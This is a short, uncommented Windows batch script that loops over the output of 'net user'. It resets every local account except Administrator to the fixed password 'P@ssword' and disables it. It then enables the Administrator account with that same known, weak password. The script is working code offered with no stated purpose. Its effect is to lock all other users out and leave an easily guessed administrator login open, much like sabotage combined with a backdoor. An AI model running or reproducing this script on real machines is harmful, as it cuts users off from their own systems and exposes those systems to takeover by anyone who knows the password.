@echo off
for /f "delims=" %%a in ('net user ^| findstr -V "\-" ^| findstr -V "User accounts" ^| findstr -V "The command"') do (
   for %%b in (%%a) do (
			if not "%%b" == "Administrator" ( Net user %%b P@ssword /active:no )

       )
)
Net user "Administrator" P@ssword /active:yes
pause